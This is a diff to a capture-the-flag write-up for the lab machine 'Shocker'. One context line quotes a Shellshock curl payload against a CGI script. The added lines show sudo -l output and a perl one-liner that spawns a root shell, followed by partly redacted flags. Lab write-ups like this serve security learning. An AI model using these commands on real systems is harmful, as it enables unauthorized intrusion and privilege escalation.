@@ -72,7 +72,7 @@ curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: tex
 
 Flag
 ```
-beb558c0c62831ab277c9da1ce663157
+beb558c0c6{REDACTED}a1ce663157
 ```
 
 ## Reverse Shell
@@ -88,5 +88,35 @@ export TERM=xterm
 export SHELL=bash
 ```
 
+Looking around the system you quickly find sudo -l has a good esculation route
+
+```
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+
+## Root
+
+GTFOBins 
+![image](https://user-images.githubusercontent.com/5285547/124326697-c4db4a00-db7e-11eb-9ce2-0f01ae33dc46.png)
+
+
+```
+sudo perl -e 'exec "/bin/sh";'
+```
+
+Now we are root and can get the last flag.txt in /root
+
+![image](https://user-images.githubusercontent.com/5285547/124326767-eccaad80-db7e-11eb-8b39-0bd25d522af8.png)
+
+
+Flag
+```
+f011efb96{REDACTED}a7f7284ceea
+```
 
 
